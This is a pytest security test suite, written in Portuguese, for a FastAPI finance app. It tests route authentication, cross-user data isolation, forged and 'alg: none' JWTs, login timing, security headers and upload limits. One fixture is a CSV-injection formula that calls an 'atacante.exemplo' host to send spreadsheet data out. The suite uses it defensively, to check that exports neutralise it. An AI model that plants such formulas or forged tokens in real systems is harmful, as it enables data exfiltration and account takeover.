"""
Segurança: nenhum usuário alcança dados de outro, de nenhuma forma.

- Inventário de rotas: toda rota exige login (menos as públicas de propósito),
  e uma rota nova só passa depois de entrar na lista revisada abaixo.
- Ataque entre usuários: B tenta ler, alterar e apagar os dados de A por
  todas as rotas; no fim, os dados de A continuam idênticos.
- Token forjado, planilha com fórmula maliciosa, tempo do login, cabeçalhos
  de segurança e limite de upload.
"""
import io
import re
from datetime import datetime, timedelta, timezone

import jwt
import pytest
from fastapi.routing import APIRoute
from openpyxl import load_workbook

from app.config import SECRET_KEY
from app.main import app
from app.routers.upload import MAX_UPLOAD_BYTES
from tests.conftest import CSV_JANEIRO, PASSWORD, upload_csv

# ---------- Inventário de rotas ----------

PUBLIC_ROUTES = {
    ("GET", "/"),
    ("POST", "/auth/register"),
    ("POST", "/auth/login"),
}

# Toda rota da API, revisada quanto ao isolamento entre usuários. Criou uma
# rota nova? Este teste falha até ela entrar aqui, depois de conferir que
# ela só enxerga dados do usuário logado (e de ganhar um ataque abaixo).
REVIEWED_ROUTES = PUBLIC_ROUTES | {
    ("GET", "/auth/me"),
    ("PATCH", "/auth/me"),
    ("DELETE", "/auth/me"),
    ("POST", "/auth/me/password"),
    ("PUT", "/auth/me/avatar"),
    ("DELETE", "/auth/me/avatar"),
    ("POST", "/upload"),
    ("GET", "/transactions"),
    ("PATCH", "/transactions/{transaction_id}"),
    ("GET", "/categories"),
    ("POST", "/categories"),
    ("PATCH", "/categories/{category_id}"),
    ("DELETE", "/categories/{category_id}"),
    ("POST", "/categories/defaults"),
    ("POST", "/categories/apply-rules"),
    ("GET", "/dashboard/by-category"),
    ("GET", "/dashboard/monthly"),
    ("GET", "/statements"),
    ("DELETE", "/statements/{statement_id}"),
    ("GET", "/reports/export"),
}


def _api_routes():
    return {
        (method, route.path)
        for route in app.routes
        if isinstance(route, APIRoute)
        for method in route.methods
    }


def test_toda_rota_da_api_foi_revisada():
    unreviewed = _api_routes() - REVIEWED_ROUTES
    assert not unreviewed, f"Rotas novas sem revisão de segurança: {sorted(unreviewed)}"


@pytest.mark.parametrize("method, path", sorted(REVIEWED_ROUTES - PUBLIC_ROUTES))
def test_toda_rota_nao_publica_exige_login(anon_client, method, path):
    response = anon_client.request(method, _fill(path))

    assert response.status_code == 401


def _fill(path: str) -> str:
    """ "/categories/{category_id}" -> "/categories/1" """
    return re.sub(r"\{[^}]+\}", "1", path)


@pytest.mark.parametrize("method, path", sorted(REVIEWED_ROUTES - PUBLIC_ROUTES))
def test_token_forjado_com_outra_chave_nao_entra(anon_client, method, path, user):
    forged = jwt.encode(
        {"sub": str(user.id), "iat": datetime.now(timezone.utc), "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
        "chave-que-o-atacante-inventou-com-32-bytes-ou-mais",
        algorithm="HS256",
    )

    response = anon_client.request(method, _fill(path), headers={"Authorization": f"Bearer {forged}"})

    assert response.status_code == 401


@pytest.mark.parametrize(
    "token",
    [
        # "alg: none": token sem assinatura, que alguns sistemas aceitam por engano
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.",
        # Token válido com o "sub" trocado na mão (assinatura não bate mais)
        None,
    ],
)
def test_token_adulterado_nao_entra(anon_client, user, other_user, token):
    if token is None:
        valid = jwt.encode(
            {"sub": str(other_user.id), "iat": datetime.now(timezone.utc), "exp": datetime.now(timezone.utc) + timedelta(hours=1)},
            SECRET_KEY,
            algorithm="HS256",
        )
        header, _payload, signature = valid.split(".")
        other_payload = jwt.utils.base64url_encode(f'{{"sub":"{user.id}"}}'.encode()).decode()
        token = f"{header}.{other_payload}.{signature}"

    response = anon_client.get("/auth/me", headers={"Authorization": f"Bearer {token}"})

    assert response.status_code == 401


# ---------- Ataque entre usuários ----------


@pytest.fixture
def victim(client, db_session, user):
    """Dados da usuária A (client): extrato, transações, categoria, perfil e foto."""
    category = client.post("/categories", json={"name": "Segredo", "keywords": "ifood"}).json()
    transactions = upload_csv(client, CSV_JANEIRO, filename="extrato-da-ana.csv").json()
    client.patch("/auth/me", json={"name": "Ana Secreta", "email": "ana@teste.com", "birth_date": "1990-01-01"})
    client.put("/auth/me/avatar", files={"file": ("a.png", b"\x89PNG\r\n\x1a\n" + b"\x01" * 20)})
    uncategorized = next(t for t in transactions if t["category_id"] is None)
    return {
        "category": category,
        "statement_id": transactions[0]["statement_id"],
        "transaction": transactions[0],
        "uncategorized": uncategorized,
    }


def _snapshot(client):
    """Tudo o que A vê, para comparar antes e depois do ataque."""
    report = client.get("/reports/export")
    return {
        "me": client.get("/auth/me").json(),
        "transactions": client.get("/transactions").json(),
        "categories": client.get("/categories").json(),
        "statements": client.get("/statements").json(),
        "by_category": client.get("/dashboard/by-category").json(),
        "monthly": client.get("/dashboard/monthly").json(),
        "report_rows": [
            row for row in load_workbook(io.BytesIO(report.content))["Transações"].iter_rows(values_only=True)
        ],
    }


def test_outro_usuario_nao_le_nem_altera_nada_de_ninguem(client, other_client, victim):
    before = _snapshot(client)
    a_cat = victim["category"]["id"]
    a_statement = victim["statement_id"]
    a_tx = victim["transaction"]["id"]

    # --- Leitura: nada de A aparece para B, com ou sem filtro pelos ids de A ---
    assert other_client.get("/auth/me").json()["name"] is None
    assert other_client.get("/auth/me").json()["avatar_url"] is None
    assert other_client.get("/transactions").json() == []
    assert other_client.get("/transactions", params={"statement_id": a_statement}).json() == []
    assert other_client.get("/transactions", params={"category_id": a_cat}).json() == []
    assert other_client.get("/categories").json() == []
    assert other_client.get("/statements").json() == []
    assert other_client.get("/dashboard/by-category", params={"statement_id": a_statement}).json() == []
    assert other_client.get("/dashboard/monthly", params={"statement_id": a_statement}).json() == []
    assert other_client.get("/reports/export", params={"statement_id": a_statement}).status_code == 404
    report = load_workbook(io.BytesIO(other_client.get("/reports/export").content))
    assert "IFOOD *RESTAURANTE XYZ" not in str(list(report["Transações"].iter_rows(values_only=True)))

    # --- Escrita: toda tentativa nos ids de A responde "não encontrado" ---
    assert other_client.patch(f"/transactions/{a_tx}", json={"category_id": None}).status_code == 404
    assert other_client.patch(f"/categories/{a_cat}", json={"name": "Hackeada"}).status_code == 404
    assert other_client.patch(f"/categories/{a_cat}", json={"keywords": "tudo"}).status_code == 404
    assert other_client.delete(f"/categories/{a_cat}").status_code == 404
    assert other_client.delete(f"/statements/{a_statement}").status_code == 404

    # B não consegue pôr a categoria de A numa transação dele
    b_tx = upload_csv(other_client, "data,descricao,valor\n2025-03-01,LOJA,-1.00\n").json()[0]
    assert other_client.patch(f"/transactions/{b_tx['id']}", json={"category_id": a_cat}).status_code == 404

    # Ações "em massa" de B só mexem nos dados de B
    other_client.post("/categories", json={"name": "Pega tudo", "keywords": "farmacia,uber,salario"})
    other_client.post("/categories/apply-rules")
    other_client.post("/categories/defaults")

    # Mesmo arquivo de A: não é "repetido" para B, e não revela nada de A
    response = upload_csv(other_client, CSV_JANEIRO)
    assert response.status_code == 200
    assert "extrato-da-ana" not in response.text

    # B troca a própria senha e exclui a própria conta: A não é afetada
    other_client.post("/auth/me/password", json={"current_password": PASSWORD, "new_password": "Girassol#Azul91"})

    assert _snapshot(client) == before
    # A transação sem categoria de A continua sem categoria (o apply-rules de B não tocou nela)
    assert next(
        t for t in client.get("/transactions").json() if t["id"] == victim["uncategorized"]["id"]
    )["category_id"] is None


def test_excluir_a_conta_de_b_nao_apaga_nada_de_a(client, other_client, victim):
    before = _snapshot(client)

    assert other_client.request("DELETE", "/auth/me", json={"password": PASSWORD}).status_code == 204

    assert _snapshot(client) == before


def test_ids_de_outro_usuario_respondem_igual_a_inexistentes(client, other_client, victim):
    # 404 igual para "não existe" e "é de outro": não dá nem para saber se o id existe
    for path in (f"/categories/{victim['category']['id']}", "/categories/999999"):
        response = other_client.patch(path, json={"name": "x"})
        assert (response.status_code, response.json()) == (404, {"detail": "Categoria não encontrada"})
    for path in (f"/statements/{victim['statement_id']}", "/statements/999999"):
        response = other_client.delete(path)
        assert (response.status_code, response.json()) == (404, {"detail": "Extrato não encontrado"})
    for path in (f"/transactions/{victim['transaction']['id']}", "/transactions/999999"):
        response = other_client.patch(path, json={"category_id": None})
        assert (response.status_code, response.json()) == (404, {"detail": "Transação não encontrada"})


def test_nada_de_senha_nem_hash_nas_respostas(client, victim):
    for path in ("/auth/me", "/transactions", "/categories", "/statements"):
        text = client.get(path).text.lower()
        assert "hashed_password" not in text
        assert "$2b$" not in text  # começo de um hash bcrypt


# ---------- Planilha: descrição maliciosa não vira fórmula ----------


MALICIOUS = '=WEBSERVICE("http://atacante.exemplo/?"&A1)'


def test_descricao_com_formula_vira_texto_no_excel(client):
    csv = f'data,descricao,valor\n2025-01-05,"{MALICIOUS}",-999.00\n2025-01-06,=1+1,-1.00\n'
    assert upload_csv(client, csv).status_code == 200

    workbook = load_workbook(io.BytesIO(client.get("/reports/export").content))

    cells = [
        cell
        for sheet in workbook.worksheets
        for row in sheet.iter_rows()
        for cell in row
        if isinstance(cell.value, str) and ("WEBSERVICE" in cell.value or cell.value == "=1+1")
    ]
    # Aparece na lista, nos maiores gastos e nos destaques do Resumo...
    assert len(cells) >= 3
    # ...sempre como texto, nunca como fórmula
    assert all(cell.data_type == "s" for cell in cells)
    # As fórmulas do próprio relatório (totais) continuam fórmulas
    assert workbook["Por mês"]["B6"].value == "=SUM(B5:B5)"
    assert workbook["Por mês"]["B6"].data_type == "f"


# ---------- Login: mesmo tempo para e-mail inexistente ----------


def test_login_confere_hash_mesmo_quando_o_email_nao_existe(anon_client, monkeypatch):
    calls = []
    import app.routers.auth as auth_router

    original = auth_router.verify_password
    monkeypatch.setattr(auth_router, "verify_password", lambda p, h: calls.append(h) or original(p, h))

    response = anon_client.post("/auth/login", data={"username": "ninguem@teste.com", "password": "qualquer"})

    assert response.status_code == 401
    # O bcrypt rodou (contra o hash de mentira): a resposta leva o mesmo tempo
    assert calls == [auth_router._DUMMY_HASH]


# ---------- Cabeçalhos de segurança ----------


def test_cabecalhos_de_seguranca_nas_respostas(client):
    response = client.get("/transactions")

    assert response.headers["cache-control"] == "no-store"
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"
    assert response.headers["referrer-policy"] == "no-referrer"
    assert response.headers["content-security-policy"] == "default-src 'none'; frame-ancestors 'none'"
    # Sem HTTPS (teste local), sem HSTS
    assert "strict-transport-security" not in response.headers


def test_hsts_quando_em_https(client):
    response = client.get("https://testserver/transactions")

    assert response.headers["strict-transport-security"] == "max-age=31536000; includeSubDomains"


def test_docs_continuam_funcionando_sem_a_csp_restrita(anon_client):
    response = anon_client.get("/docs")

    assert response.status_code == 200
    assert "content-security-policy" not in response.headers


def test_erro_de_login_tambem_tem_os_cabecalhos(anon_client):
    response = anon_client.get("/transactions")

    assert response.status_code == 401
    assert response.headers["cache-control"] == "no-store"


# ---------- Upload ----------


def test_upload_grande_demais_e_recusado(client):
    content = b"data,descricao,valor\n" + b"x" * MAX_UPLOAD_BYTES

    response = client.post("/upload", files={"file": ("grande.csv", content, "text/csv")})

    assert response.status_code == 413
    assert response.json()["detail"] == "O arquivo pode ter no máximo 5 MB"
    assert client.get("/statements").json() == []
